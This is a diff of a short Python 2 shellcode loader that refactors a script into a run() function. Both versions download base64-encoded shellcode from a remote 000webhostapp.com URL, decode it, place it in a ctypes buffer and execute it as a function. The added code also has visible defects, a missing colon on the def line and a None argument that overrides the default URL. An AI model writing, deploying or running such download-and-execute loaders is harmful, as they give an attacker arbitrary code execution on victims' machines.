@@ -2,18 +2,13 @@ import urllib2
 import ctypes
 import base64
 
-# retrieve the shellcode from our web server
-url = "http://elderlyeggplant.000webhostapp.com:8000/shellcode.bin"
-response = urllib2.urlopen(url)
+def run(url="http://elderlyeggplant.000webhostapp.com:8000/shellcode.bin")
+    response        = urllib2.urlopen(url)
+    shellcode       = base64.b64decode(response.read())
+    shellcode_buff  = ctypes.create_string_buffer(shellcode, len(shellcode))
+    shellcode_func  = ctypes.cast(shellcode_buff, ctypes.CFUNCTYPE(ctypes.c_void_p))
+    shellcode_func()
 
-# decode the shellcode from base64 
-shellcode = base64.b64decode(response.read())
-
-# create a buffer in memory
-shellcode_buffer = ctypes.create_string_buffer(shellcode, len(shellcode))
-
-# create a function pointer to our shellcode
-shellcode_func   = ctypes.cast(shellcode_buffer, ctypes.CFUNCTYPE(ctypes.c_void_p))
-
-# call our shellcode
-shellcode_func()
+if __name__ == '__main__':
+    url = sys.argv[1] if len(sys.argv) > 1 else None
+    run(url)
